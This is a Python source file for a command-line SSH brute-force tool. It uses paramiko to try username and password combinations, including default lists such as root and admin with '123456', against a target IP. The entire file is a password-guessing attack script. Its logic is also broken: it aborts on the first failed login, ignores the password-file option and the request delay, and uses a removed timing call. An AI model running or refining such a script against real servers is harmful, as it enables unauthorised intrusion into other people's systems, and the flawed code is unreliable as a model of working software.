
import paramiko
import time
import argparse
import logging

from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException

logging.basicConfig()


class Engine(object):
    user_path = None
    pass_path = None
    target = ''
    userlist = ['root', 'admin', 'ubuntu', 'Administrator']
    passlist = ['password', '123456', 'letmein', 'superman', 'password123']
    calc_times = []

    req_time = 0.0
    num_pools = 10

    start_time = 0.0
    end_time = 0.0

    def __init__(self, target, userfile=None, req_time=0.0, passfile=None):
        """
        Initialize ssh brute force engine
        :param target: should be an IP address (string)
        :param userfile: string file path to the file with usernames -- one username per line
        :param req_time: time (in seconds) to wait between requests
        :param passfile: string file path to the file with passwords -- one password per line
        :return:
        """
        self.req_time = req_time
        self.target = target
        self.user_path = userfile
        self.pass_path = passfile
        if self.user_path:
            self.userlist = self.load_file(userfile)
        if self.pass_path:
            self.passlist = self.load_file(passfile)

    def load_file(self, filepath):
        """
        Helper function that loads a filepath and reads the contents.
        :param filepath: string filepath
        :return: a list of each line as an item in the list
        """
        data = []
        with open(filepath, 'r') as f:
            data = f.read().splitlines()
        return data

    # def partition_list(self, p_list):
    #     p_size = len(p_list) / self.num_pools
    #     for i in xrange(0, len(p_list), p_size):
    #         yield p_list[i:i+p_size]

    def init_ssh(self):
        """
        Initialization of Paramiko ssh object
        :return: paramiko ssh object
        """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        return ssh

    def execute(self):

        self.start_time = time.clock()

        ssh = self.init_ssh()

        for user in self.userlist:
            for pw in self.passlist:
                try:
                    logging.debug('Attempting to connect: %s:%s' % (user, pw))
                    ssh.connect(self.target, username=user, password=pw)
                except BadHostKeyException:
                    logging.debug('BadHostException: %s:%s' % (user, pw))
                    raise
                except AuthenticationException:
                    logging.debug('AuthenticationException: %s:%s' % (user, pw))
                    raise
                except SSHException:
                    logging.debug('SSHException: %s:%s' % (user, pw))
                    raise

        self.end_time = time.clock()
        total = self.end_time - self.start_time
        logging.debug('\nTotal Execution Time: %s\n' % total)


def main(ip_addr, userfile=None, req_time=0.0, passfile=None):
    if ip_addr == '' or not ip_addr:
        print('No target IP specified')
        return
    if userfile == '':
        userfile = None
    if passfile == '':
        passfile = None
    engine = Engine(target=ip_addr, userfile=userfile, req_time=req_time, passfile=passfile)
    engine.execute()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple ssh brute-force script')
    parser.add_argument('ip', help='[Required] The IP of the target server')
    parser.add_argument('-u', '--userlist', help='Specify a filepath with a list of usernames to try -- one username per line')
    parser.add_argument('-p', '--passlist', help='Specify a filepath with a list of passwords to try -- one password per line')
    parser.add_argument('-t', '--time', help='Set the time between requests (in seconds)')

    ip_addr = None
    filename = None
    req_time = 0.0
    args = parser.parse_args()

    if args.ip:
        ip_addr = args.ip
    if args.userlist:
        filename = args.userlist
    if args.time:
        req_time = float(args.time)
    main(ip_addr, filename, req_time)